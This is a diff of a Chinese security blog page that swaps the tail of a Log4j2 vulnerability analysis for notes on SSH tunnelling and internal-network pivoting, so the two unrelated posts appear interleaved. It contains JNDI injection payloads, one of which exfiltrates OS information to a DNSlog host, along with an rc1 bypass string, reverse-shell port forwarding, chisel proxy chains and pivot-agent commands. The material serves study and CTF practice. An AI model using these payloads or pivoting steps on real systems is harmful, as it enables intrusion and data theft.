-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604171604286.png" alt="image-20230604171604286"></p>
-<p>到这里漏洞流程就结束了，但是还有一点问题</p>
-<p>比如在源码解析里的日志级别好像并没有提到</p>
-<p>日志级别也是影响是否能实现log4j2漏洞的一个因素</p>
-<p>原因就是不管输出哪个级别的日志，都要调用这一个方法</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604172239250.png" alt="image-20230604172239250"></p>
-<p>logIfEnabled方法用来判断日志优先级</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604172342240.png" alt="image-20230604172342240"></p>
-<p>由于默认情况下是error，所以小于error的warn, info, debug, trace都不会满足这个判断，直接就返回了，不能接着往下走，也就不会触发漏洞了</p>
-<p>可以在配置文件里自行设置优先级</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604172559918.png" alt="image-20230604172559918"></p>
-<h2 id="外带"><a href="#外带" class="headerlink" title="外带"></a>外带</h2><p>就dnslog外带，也没啥特别的，只不过是借助log4j2的递归解析</p>
-<pre class="language-java" data-language="java"><code class="language-java">$&#123;jndi:ldap:&#x2F;&#x2F;$&#123;java:os&#125;.2lnhn2.ceye.io&#125;</code></pre>
+<p>的目的就算在本地访问127.0.0.1:8888时通过跳板机10.0.0.1访问到192.168.1.100:80上的服务</p>
+<p>远程端口转发的目的则是让被攻击ip能够访问本地的服务（ 比如反弹shell），</p>
+<pre class="language-sh" data-language="sh"><code class="language-sh">ssh -CfNg -R 8888:127.0.0.1:22 user@10.0.0.1</code></pre>
 
-<p>先解析${java:os}，把东西拿到，然后再去发起请求</p>
-<h2 id="rc1绕过"><a href="#rc1绕过" class="headerlink" title="rc1绕过"></a>rc1绕过</h2><p>在爆出log4j2这个核弹级漏洞后，apache自然是进行了修复</p>
-<p>这次修复把MessagePatternConverter这个类进行了大改</p>
-<p>我直接截个先知社区的图</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604173121165.png" alt="image-20230604173121165"></p>
-<p>并且在 2.15.0-rc1的更新包中，移除了从 Properties 中获取 Lookup 配置的选项，并修改判断逻辑，默认不开启 lookup 功能。</p>
-<p>还有就是在<code>JndiManager#lookup</code> 方法中添加了校验，使用了 JndiManagerFactory 来创建 JndiManager 实例，不再使用 InitialContext，而是使用子类 InitialDirContext，并为其添加白名单 JNDI 协议、白名单主机名、白名单类名。</p>
-<p>感觉不是很好利用，属于是除了ctf故意出题想不到还存在的场景了</p>
-<p>所以就简单说了</p>
-<p>rc1把format挪到LookupMessagePatternConverter里了</p>
-<p>而只有在开启 lookup 功能时才会使用 <code>LookupMessagePatternConverter</code> 来进行 Lookup 和替换</p>
-<p>所以必须在配置文件里开启lookup才行</p>
-<p>就是在%msg后边加个{lookups}</p>
-<p>然后又因为还有个地址校验，只允许本地的发起请求了</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604180008800.png" alt="image-20230604180008800"></p>
-<p>但是这个东西有个最离谱的问题，就是它的catch里没return</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604180145857.png" alt="image-20230604180145857"></p>
-<p>所以只要try里报错，就直接进this.context.lookup了</p>
-<p>所以就在exp前边加个空格让触发 <code>URISyntaxException</code> 异常</p>
-<pre class="language-poc" data-language="poc"><code class="language-poc">$&#123;jndi:ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F; exp&#125;</code></pre>
+<p>此时如果有人访问10.0.0.1的8888端口，SSH 会把这个请求转发给你本地的 <code>localhost:22</code>。</p>
+<h2 id="1-2-动态端口转发"><a href="#1-2-动态端口转发" class="headerlink" title="1.2 动态端口转发"></a>1.2 动态端口转发</h2><ul>
+<li>动态端口转发，<strong>相当于在 ssh 发起端创建一个 SOCKS 代理服务</strong>，所有使用这个 socks 的请求，都将转发到 ssh 远端，并将由 ssh 远端发起数据请求，并返回给 ssh 发起端，发起端将数据送回请求端。</li>
+<li>这种转发<strong>不规定目标主机和目标端口，</strong>而是去读取应用发起的请求，从请求中获取目标信息。在这种情况下，SSH 服务器要去访问哪一个网站，完全是动态的，取决于原始通信，所以就叫做动态端口转发。</li>
+<li>SOCKS：防火墙安全会话转换协议 （Socks: Protocol for sessions traversal across firewall securely） SOCKS协议提供一个框架，为在 TCP和UDP域中的客户机/服务器应用程序能更方便安全地使用网络防火墙所提供的服务。协议工作在OSI参考模型的第5层(会话层)，使用TCP协议传输数据，因而不提供如传递 ICMP信息之类的网络层网关服务。</li>
+<li>SOCKS代理使用范围很广，但SOCKS有SOCK4和SOCK5之分。其中SOCK4只支持TCP协议，SOCK5支持TCP和UDP协议，还支持身份验证、服务器端域名解释等。SOCK4能干的SOCK5都可以干，反过来就不行。我们常用的聊天软件(如QQ)，起初就一直用的是TCP和UDP协议，所以只能用SOCK5的代理。</li>
+</ul>
+<p>本地主机（A）、跳板机（B）、随机目标机（C）</p>
+<p>A的自定义端口作为socks服务端口，请求发送到本地端口，本地端口就把请求转发到跳板机上</p>
+<p>用法：</p>
+<pre class="language-sh" data-language="sh"><code class="language-sh">ssh -CfNg -D 本地端口 跳板账号@ip</code></pre>
 
-<h2 id="rc2"><a href="#rc2" class="headerlink" title="rc2"></a>rc2</h2><p>在catch里把return加上了</p>
-<p>似乎是还有绕过方法，但是对于那种配置文件要求苛刻的绕过，感觉意义不是很大</p>
-<h2 id="2-16-0-rc1"><a href="#2-16-0-rc1" class="headerlink" title="2.16.0-rc1"></a>2.16.0-rc1</h2><p>直接不支持日志信息的lookup了，所以log4j2漏洞就彻底结束了</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>看起来log4j2的原理并不麻烦，甚至有点简单，但是我还是有点不太理解的地方，就是log4j2作为一个日志，为什么要去支持jndi的lookup，为什么要去远程请求东西。（可能确实用处不大吧，毕竟2.16版本直接删了</p>
-<p>另外对于log4j2的jndi注入还衍生出了许多技巧。例如编码绕过、关键字截取、Appenders等，这里就不详细写了，用到再搜吧（</p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://su18.org/post/log4j2/">https://su18.org/post/log4j2/</a></p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1789/">https://paper.seebug.org/1789/</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dreamthe/article/details/123230283">log4j2漏洞原理和漏洞环境搭建复现_log4j2原理_糊涂是福yyyy的博客-CSDN博客</a></p>
+<p>例子（现在似乎是socket5？）：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506022058997.png" alt="image-20250602205851679"></p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><pre class="language-none"><code class="language-none">你本地Kali 
+   ⇩（SSH）
+VPS（168.2.10.2）
+   ⇩（攻击&#x2F;反弹 shell）
+靶机（172.1.100.2）
+   ⇩（RDP 弱口令登录）
+Windows（192.1.10.222）
+   ⇩（代理&#x2F;隧道）
+深内网（192.168.50.0&#x2F;24）</code></pre>
+
+<h3 id="如何让本地kali可直接访问172-1-100-2"><a href="#如何让本地kali可直接访问172-1-100-2" class="headerlink" title="如何让本地kali可直接访问172.1.100.2"></a>如何让本地kali可直接访问172.1.100.2</h3><h4 id="①-启动-SOCKS5-代理："><a href="#①-启动-SOCKS5-代理：" class="headerlink" title="① 启动 SOCKS5 代理："></a>① 启动 SOCKS5 代理：</h4><pre class="language-sh" data-language="sh"><code class="language-sh">ssh -D 1080 root@168.2.10.2</code></pre>
+
+<ul>
+<li><code>-D 1080</code> 表示在本地 Kali 开一个 SOCKS5 代理监听在 127.0.0.1:1080</li>
+</ul>
+<h4 id="②-配置-proxychains："><a href="#②-配置-proxychains：" class="headerlink" title="② 配置 proxychains："></a>② 配置 proxychains：</h4><p>编辑 <code>/etc/proxychains.conf</code>（或 <code>/etc/proxychains4.conf</code>）：</p>
+<pre class="language-sh" data-language="sh"><code class="language-sh"># 最后一行添加或替换为：
+socks5 127.0.0.1 1080</code></pre>
+
+<h4 id="③-使用-proxychains-访问-172-1-100-2："><a href="#③-使用-proxychains-访问-172-1-100-2：" class="headerlink" title="③ 使用 proxychains 访问 172.1.100.2："></a>③ 使用 proxychains 访问 172.1.100.2：</h4><pre class="language-sh" data-language="sh"><code class="language-sh">proxychains fscan -h 172.1.100.2
+proxychains ssh user@172.1.100.2</code></pre>
+
+<h3 id="如何让本地kali可以直接访问192-1-10-222（存疑，有时间搭一下环境试试）"><a href="#如何让本地kali可以直接访问192-1-10-222（存疑，有时间搭一下环境试试）" class="headerlink" title="如何让本地kali可以直接访问192.1.10.222（存疑，有时间搭一下环境试试）"></a>如何让本地kali可以直接访问192.1.10.222（存疑，有时间搭一下环境试试）</h3><h4 id="方案-1：用-ssh-L-做端口中继（多跳）"><a href="#方案-1：用-ssh-L-做端口中继（多跳）" class="headerlink" title="方案 1：用 ssh -L 做端口中继（多跳）"></a>方案 1：用 <code>ssh -L</code> 做端口中继（多跳）</h4><p>你可以让 VPS 本地监听一个端口，把流量转发给 172.1.100.2：</p>
+<p><strong>步骤如下：</strong></p>
+<p><strong>第一步：从 Kali 到 VPS，建立第一跳代理（假设 VPS 是 168.2.10.2）</strong></p>
+<pre class="language-none"><code class="language-none">Kali上执行
+ssh -L 9000:127.0.0.1:9001 user@168.2.10.2</code></pre>
+
+<p>这一步的意思是：</p>
+<ul>
+<li>把 Kali 本地 9000 端口映射到 VPS 上的 9001 端口。</li>
+</ul>
+<p><strong>第二步：在 VPS 上执行</strong></p>
+<pre class="language-none"><code class="language-none"># VPS 上执行
+ssh -D 9001 user@172.1.100.2</code></pre>
+
+<ul>
+<li>这时候你在 Kali 上访问本地的 9000，就相当于访问到了 VPS 上的 <code>ssh -D 9001</code>。</li>
+<li>这样就实现了一个“间接 socks5”代理。</li>
+</ul>
+<p>然后你在 Kali 上使用：</p>
+<pre class="language-none"><code class="language-none">proxychains fscan -h 192.1.10.222</code></pre>
+
+<p>（proxychains 配置 <code>socks5 127.0.0.1 9000</code>）</p>
+<hr>
+<h4 id="方案-2：使用-chisel-SSH-多跳构建-socks5-隧道"><a href="#方案-2：使用-chisel-SSH-多跳构建-socks5-隧道" class="headerlink" title="方案 2：使用 chisel + SSH 多跳构建 socks5 隧道"></a>方案 2：使用 <code>chisel</code> + SSH 多跳构建 socks5 隧道</h4><p>比如 <code>proxytunnel</code>、<code>chisel</code>、<code>ssf</code> 等工具就可以链式转发，甚至自动多跳 socks5。</p>
+<hr>
+<p><strong>第 1 步：Kali 连 VPS，建立一个 socks5 客户端口</strong></p>
+<p>在 Kali 上运行：</p>
+<pre class="language-sh" data-language="sh"><code class="language-sh"># Kali 本地监听 1080 端口，作为 socks5 客户端
+ssh -L 1080:localhost:1080 user@168.2.10.2</code></pre>
+
+<p>意思是：</p>
+<ul>
+<li>Kali 的 <code>localhost:1080</code> 映射到 VPS 的 <code>localhost:1080</code></li>
+</ul>
+<hr>
+<p><strong>第 2 步：在 VPS 上开启 <code>chisel</code> 客户端，连接 172.1.100.2 上的 <code>chisel</code> 服务器</strong></p>
+<p>2.1 在 172.1.100.2 上运行：</p>
+<pre class="language-sh" data-language="sh"><code class="language-sh"># 让 172.1.100.2 作为 chisel 服务器，提供 socks5 代理
+.&#x2F;chisel server --port 8000 --socks5</code></pre>
+
+<p>2.2 在 VPS 上运行：</p>
+<pre class="language-sh" data-language="sh"><code class="language-sh"># VPS 连接到 172.1.100.2，转发 socks5 流量
+.&#x2F;chisel client 172.1.100.2:8000 R:1080:socks</code></pre>
+
+<p>这意味着：</p>
+<ul>
+<li>VPS 的本地端口 1080 是一个 socks5 代理，实际是由 172.1.100.2 提供服务的。</li>
+</ul>
+<hr>
+<p><strong>第 3 步：Kali 上配置 proxychains 使用 <code>127.0.0.1:1080</code> 即可访问 192.1.10.222</strong></p>
+<p>配置 <code>/etc/proxychains.conf</code>：</p>
+<pre class="language-none"><code class="language-none">socks5 127.0.0.1 1080</code></pre>
+
+<p>然后你就可以：</p>
+<pre class="language-none"><code class="language-none">proxychains fscan -h 192.1.10.222</code></pre>
+
+
+
+
+
+<p>被控机:./linux_x64_agent -l 192.168.124.129:80(攻击机可访问的地址) -s 80<br>控制端: ./linux_x64_admin -c 192.168.124.129:80 -s 80<br>getshell</p>
+<p>控制端:<br>use 0<br>listen<br>被控机:windows_x64_agent.exe -c 192.168.20.128:10001 -s 80</p>
+<p>监听端口 -l port -s 盐</p>
+<p>主动连接 -c ip:port  -s 盐</p>
 
                 
             </div>
@@ -932,7 +697,7 @@ final String name &#x3D; var.substring(prefixPos + 1);</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2023/06/04/log4j2%E6%BC%8F%E6%B4%9E/">https://Ethe448.github.io/2023/06/04/log4j2%E6%BC%8F%E6%B4%9E/</a>
+                    <a href="https://Ethe448.github.io/2025/06/04/SSH%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">https://Ethe448.github.io/2025/06/04/SSH%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -970,12 +735,8 @@ final String name &#x3D; var.substring(prefixPos + 1);</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
-                                    <span class="chip bg-color">web学习</span>
-                                </a>
-                            
-                                <a href="/tags/Java/">
-                                    <span class="chip bg-color">Java</span>
+                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">内网渗透</span>
                                 </a>
                             
                         </div>
@@ -1415,9 +1176,10 @@ final String name &#x3D; var.substring(prefixPos + 1);</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2025/06/04/SSH%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
                     <div class="card-image">
@@ -1435,9 +1197,9 @@ final String name &#x3D; var.substring(prefixPos + 1);</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-06-04
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-06-04
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1446,6 +1208,7 @@ final String name &#x3D; var.substring(prefixPos + 1);</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1464,13 +1227,13 @@ final String name &#x3D; var.substring(prefixPos + 1);</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/05/22/JNDI%E6%B3%A8%E5%85%A5/">
+                <a href="/2023/06/04/log4j2%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/1.jpg" class="responsive-img" alt="JNDI注入">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/0.jpg" class="responsive-img" alt="log4j2漏洞">
                         
-                        <span class="card-title">JNDI注入</span>
+                        <span class="card-title">log4j2漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1481,7 +1244,7 @@ final String name &#x3D; var.substring(prefixPos + 1);</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-06-04
                             </span>
                         <span class="publish-author">
                             
